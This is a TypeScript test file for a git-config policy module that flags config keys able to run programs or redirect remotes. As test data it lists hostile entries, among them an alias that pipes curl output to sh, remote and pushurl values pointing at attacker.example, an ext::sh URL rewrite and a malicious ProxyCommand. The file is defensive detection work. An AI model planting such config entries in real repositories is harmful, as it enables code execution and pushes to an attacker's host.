import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import {
  addedRemoteNames,
  changedExecutableGitConfigKeys,
  executableGitConfigEntries,
  isInertGitConfigEntry,
  parseGitConfigList,
} from './git-config-policy.ts'

describe('isInertGitConfigEntry', () => {
  it('admits what ordinary contained git work writes', () => {
    for (const [key, value] of [
      ['core.repositoryformatversion', '0'],
      ['core.bare', null],
      ['branch.main.remote', 'origin'],
      ['branch.feature/x.merge', 'refs/heads/feature/x'],
      ['branch.main.copse-worktree-recovery', 'abc'],
      ['remote.upstream.fetch', '+refs/heads/*:refs/remotes/upstream/*'],
      ['submodule.lib.url', '../lib.git'],
      ['submodule.lib.active', 'true'],
      ['submodule.lib.update', 'rebase'],
      ['filter.lfs.process', 'git-lfs filter-process'],
      ['filter.lfs.required', 'true'],
      ['lfs.repositoryformatversion', '0'],
      ['lfs.https://example.com/repo.git/info/lfs.access', 'basic'],
      ['user.email', 'dev@example.com'],
      ['pull.rebase', 'true'],
      ['extensions.worktreeconfig', 'true'],
    ] as const) {
      assert.equal(isInertGitConfigEntry({ key, value }), true, key)
    }
  })

  it('treats every key that can start a program as executable', () => {
    for (const [key, value] of [
      ['core.fsmonitor', './watch.sh'],
      ['core.hookspath', '.githooks'],
      ['core.sshcommand', 'ssh -o ProxyCommand=evil'],
      ['core.pager', 'sh -c evil'],
      ['core.editor', 'evil'],
      ['core.worktree', '/home/user'],
      ['alias.up', '!curl https://example.net | sh'],
      ['alias.st', 'status'],
      ['filter.lfs.process', 'sh -c evil'],
      ['filter.crypt.clean', 'evil'],
      ['diff.pdf.textconv', 'evil'],
      ['diff.external', 'evil'],
      ['merge.ours.driver', 'evil'],
      ['credential.helper', 'store'],
      ['gpg.program', 'evil'],
      ['include.path', '../shared.cfg'],
      ['includeif.gitdir:/x/.path', 'evil.cfg'],
      ['remote.origin.uploadpack', 'evil'],
      ['remote.origin.url', 'https://attacker.example/repo.git'],
      ['remote.origin.pushurl', 'https://attacker.example/repo.git'],
      ['url.https://attacker.example/.pushinsteadof', 'https://github.com/'],
      ['remote.pushdefault', 'evil'],
      ['submodule.lib.update', '!evil'],
      ['protocol.ext.allow', 'always'],
      ['url.ext::sh -c evil.insteadof', 'https://github.com/'],
      ['lfs.customtransfer.evil.path', 'evil'],
      ['sequence.editor', 'evil'],
      ['some.future.key', 'x'],
    ] as const) {
      assert.equal(isInertGitConfigEntry({ key, value }), false, key)
    }
  })
})

describe('parseGitConfigList', () => {
  it('splits null-terminated records and keeps bare booleans', () => {
    assert.deepEqual(parseGitConfigList('core.bare\0remote.Up.url\nhttps://x\ny\0'), [
      { key: 'core.bare', value: null },
      { key: 'remote.Up.url', value: 'https://x\ny' },
    ])
  })
})

describe('remote destinations', () => {
  const before = parseGitConfigList(
    'remote.origin.url\nhttps://github.com/o/r.git\0remote.origin.fetch\n+refs/heads/*:refs/remotes/origin/*\0',
  )

  it('allows a remote the command adds', () => {
    const after = parseGitConfigList(
      `remote.origin.url\nhttps://github.com/o/r.git\0remote.fork.url\nhttps://github.com/me/r.git\0remote.fork.fetch\n+refs/heads/*:refs/remotes/fork/*\0`,
    )
    const added = addedRemoteNames(before, after)
    assert.deepEqual([...added], ['fork'])
    assert.deepEqual(
      executableGitConfigEntries(before, added),
      executableGitConfigEntries(after, added),
    )
    assert.deepEqual(changedExecutableGitConfigKeys(before, after), [])
  })

  it('names a changed, renamed or removed existing remote URL', () => {
    const setUrl = parseGitConfigList('remote.origin.url\nhttps://attacker.example/r.git\0')
    assert.deepEqual(changedExecutableGitConfigKeys(before, setUrl), ['remote.origin.url'])
    const pushUrl = parseGitConfigList(
      'remote.origin.url\nhttps://github.com/o/r.git\0remote.origin.pushurl\nhttps://attacker.example/r.git\0',
    )
    assert.deepEqual(changedExecutableGitConfigKeys(before, pushUrl), ['remote.origin.pushurl'])
    const renamed = parseGitConfigList('remote.evil.url\nhttps://github.com/o/r.git\0')
    assert.deepEqual(changedExecutableGitConfigKeys(before, renamed), ['remote.origin.url'])
  })
})

describe('executable entry comparison', () => {
  it('ignores inert changes and names changed executable keys', () => {
    const before = parseGitConfigList('core.bare\nfalse\0alias.st\nstatus\0')
    const inert = parseGitConfigList(
      'core.bare\nfalse\0alias.st\nstatus\0branch.main.remote\norigin\0',
    )
    assert.deepEqual(executableGitConfigEntries(before), executableGitConfigEntries(inert))
    const hostile = parseGitConfigList('core.bare\nfalse\0core.fsmonitor\n./x\0')
    assert.deepEqual(changedExecutableGitConfigKeys(before, hostile), [
      'alias.st',
      'core.fsmonitor',
    ])
  })
})
